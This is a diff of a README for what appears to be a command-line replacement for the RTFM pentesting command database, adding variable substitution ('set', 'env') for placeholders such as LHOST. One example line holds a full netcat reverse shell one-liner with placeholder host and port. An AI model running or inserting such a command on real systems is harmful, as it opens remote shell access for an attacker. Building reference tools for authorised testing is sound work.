@@ -6,9 +6,10 @@ The goal of this project is to create an easier to use and updated replacement f
 - Ctrl+r to dynamically search the RTFM database for commands as you type and display those in a selectable list.  Works similarly to using Ctrl+r to search through terminal history.
 - Ctrl+h to display a history of previously selected commands from the current session in a selectable list. 
 - up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
-- 'info' displays full information on the currently selected command.  'full information' is very sparse at the moment.  
+- 'info' displays full information on the currently selected command along with any variables that can be set and that are already set.  
 - 'add -c [command]' to add a new command to the database.  optional: -d to add a comment/description with the command.
 - 'update [column] [content]' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
+- 'set' to set variables that will be replaced in commands that have placeholders such as [LHOST], [RHOST], etc. Example: 'set LHOST 10.200.13.3'
 
 ## Currently Working On
 - 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
@@ -16,11 +17,10 @@ The goal of this project is to create an easier to use and updated replacement f
 - I'm just going to update and edit the database as I use the tool because I'm not interested in doing data entry.
 
 ## To Add
-- [ ] Set variables in the CLI to automatically replace placeholders in commands for things like Remote Host, Local Host, Local Port, etc similar to msfconsole.  
-    - Need to standardize the naming of placeholders that are already in the RTFM database because sometimes the local host IP is represented as [me],[IP],[LHOST] or [lip].
+- [x] Set variables in the CLI to automatically replace placeholders in commands for things like Remote Host, Local Host, Local Port, etc similar to msfconsole.  
 - [ ] Add config file to store user set variables and other as yet to be determined configurations.
     - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
-- [ ] Add 'env' command to display all variables set in the user's config file
+- [x] Add 'env' command to display all user set variables.
 - [ ] Switch from termion to crossterm for Windows support.
 - [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
 - [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
